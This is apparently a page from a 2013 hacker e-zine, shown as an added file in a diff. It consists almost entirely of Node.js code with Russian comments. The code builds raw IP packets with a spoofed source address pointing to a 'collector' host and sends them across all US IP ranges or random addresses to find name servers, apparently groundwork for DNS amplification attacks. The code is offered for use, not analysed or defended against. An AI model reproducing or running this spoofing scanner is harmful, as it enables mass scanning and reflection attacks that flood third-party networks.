+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt8</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">9</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt8</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">9</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_crc<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt16BE</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">10</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt16BE</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">10</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_source_addr<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt32BE</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">12</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt32BE</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">12</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_dest_addr<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt32BE</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">16</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt32BE</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">16</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #006600; font-style: italic;">//process IP ranges</span>
+<span style="color: #003366; font-weight: bold;">function</span> parseIpFile<span style="color: #009900;">&#40;</span>filename<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+&nbsp;
+ <span style="color: #003366; font-weight: bold;">var</span> diapasons <span style="color: #339933;">=</span> <span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+ <span style="color: #003366; font-weight: bold;">var</span> ip_database <span style="color: #339933;">=</span> fs.<span style="color: #660066;">readFileSync</span><span style="color: #009900;">&#40;</span>filename<span style="color: #009900;">&#41;</span>.<span style="color: #660066;">toString</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span>.<span style="color: #660066;">split</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'n'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+ console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;ranges readed : %d&quot;</span><span style="color: #339933;">,</span> ip_database.<span style="color: #660066;">length</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+ <span style="color: #003366; font-weight: bold;">var</span> totalAddreses <span style="color: #339933;">=</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">for</span><span style="color: #009900;">&#40;</span><span style="color: #003366; font-weight: bold;">var</span> i <span style="color: #339933;">=</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> ip_database.<span style="color: #660066;">length</span><span style="color: #339933;">;</span> i <span style="color: #339933;">++</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+&nbsp;
+  <span style="color: #003366; font-weight: bold;">var</span> rangeStartEnd <span style="color: #339933;">=</span> ip_database<span style="color: #009900;">&#91;</span>i<span style="color: #009900;">&#93;</span>.<span style="color: #660066;">split</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'-'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #003366; font-weight: bold;">var</span> startIp <span style="color: #339933;">=</span> ip2long<span style="color: #009900;">&#40;</span>rangeStartEnd<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #003366; font-weight: bold;">var</span> endIp <span style="color: #339933;">=</span> ip2long<span style="color: #009900;">&#40;</span>rangeStartEnd<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">1</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+  totalAddreses <span style="color: #339933;">+=</span> <span style="color: #009900;">&#40;</span>endIp <span style="color: #339933;">-</span> startIp<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+  diapasons.<span style="color: #660066;">push</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>
+   startIp<span style="color: #339933;">,</span>
+   endIp
+  <span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span>
+&nbsp;
+ console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'total addreses : %d'</span><span style="color: #339933;">,</span> totalAddreses<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">return</span> diapasons<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> sendPacket<span style="color: #009900;">&#40;</span>possibleNSip<span style="color: #339933;">,</span> callback<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+&nbsp;
+ ip_packet_dest_addr<span style="color: #009900;">&#40;</span>buffer<span style="color: #339933;">,</span> possibleNSip<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ ip_packet_source_addr<span style="color: #009900;">&#40;</span>buffer<span style="color: #339933;">,</span> collectorIpLong<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+&nbsp;
+ socket.<span style="color: #660066;">send</span> <span style="color: #009900;">&#40;</span>buffer<span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">,</span> buffer.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> long2ip<span style="color: #009900;">&#40;</span>possibleNSip<span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> 
+ <span style="color: #003366; font-weight: bold;">function</span> <span style="color: #009900;">&#40;</span>error<span style="color: #339933;">,</span> bytes<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+     callback<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> randomIp<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+ <span style="color: #000066; font-weight: bold;">return</span> ip2long<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>rand<span style="color: #009900;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span>rand<span style="color: #009900;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span>rand<span style="color: #009900;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span>
+ rand<span style="color: #009900;">&#40;</span><span style="color: #CC0000;">250</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#93;</span>.<span style="color: #660066;">join</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'.'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> repeater<span style="color: #009900;">&#40;</span>diapasons<span style="color: #339933;">,</span> nextIp <span style="color: #339933;">,</span> endIp<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+ <span style="color: #003366; font-weight: bold;">var</span> current_ip <span style="color: #339933;">=</span> nextIp<span style="color: #339933;">;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>diapasons<span style="color: #009900;">&#41;</span> <span style="color: #339933;">===</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+  current_ip <span style="color: #339933;">=</span> randomIp<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>current_ip<span style="color: #009900;">&#41;</span> <span style="color: #339933;">===</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  <span style="color: #003366; font-weight: bold;">var</span> current_iprange <span style="color: #339933;">=</span> diapasons.<span style="color: #660066;">shift</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span> current_iprange.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+   current_ip <span style="color: #339933;">=</span> current_iprange<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+   endIp <span style="color: #339933;">=</span> current_iprange<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">1</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+  <span style="color: #009900;">&#125;</span><span style="color: #000066; font-weight: bold;">else</span><span style="color: #009900;">&#123;</span> 
+   repeater<span style="color: #009900;">&#40;</span>diapasons<span style="color: #339933;">,</span> undefined<span style="color: #339933;">,</span> undefined<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #009900;">&#125;</span>
+ <span style="color: #009900;">&#125;</span>
+&nbsp;
+ sendPacket<span style="color: #009900;">&#40;</span>current_ip<span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+  <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span>current_ip <span style="color: #339933;">===</span> endIp<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+   console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'end of range, try next'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+   repeater<span style="color: #009900;">&#40;</span>diapasons<span style="color: #339933;">,</span> undefined<span style="color: #339933;">,</span> undefined<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #009900;">&#125;</span><span style="color: #000066; font-weight: bold;">else</span><span style="color: #009900;">&#123;</span> 
+   process.<span style="color: #660066;">nextTick</span><span style="color: #009900;">&#40;</span><span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+    repeater<span style="color: #009900;">&#40;</span>diapasons<span style="color: #339933;">,</span> current_ip <span style="color: #339933;">+</span> <span style="color: #CC0000;">1</span><span style="color: #339933;">,</span> endIp<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+   <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #009900;">&#125;</span>
+ <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">var</span> collectorIp <span style="color: #339933;">=</span> <span style="color: #3366CC;">'1.2.3.4'</span><span style="color: #339933;">;</span> <span style="color: #006600; font-style: italic;">// IP клиента, принимающего пакеты</span>
+<span style="color: #003366; font-weight: bold;">var</span> collectorIpLong <span style="color: #339933;">=</span> ip2long<span style="color: #009900;">&#40;</span>collectorIp<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #006600; font-style: italic;">//для рандома передаем undefined вместо списка айпи</span>
+<span style="color: #006600; font-style: italic;">//repeater(undefined, undefined, undefined);</span>
+<span style="color: #006600; font-style: italic;">//для отправке по диапазонам, передаем отпарсенный диапазон</span>
+repeater<span style="color: #009900;">&#40;</span>parseIpFile<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'US_ipranges.txt'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> undefined<span style="color: #339933;">,</span> undefined<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+						<p class="warning"><a href="dnsa_0.html"><<< Part 0</a></p> 
+
+
+<p class="warning"><br>______________________________<br>
+MZh<br>
+2013<br><br>
+Inception E-Zine</p>
+
+				</td>
+			</tr>
+		</table>
+	</body>
+</html>
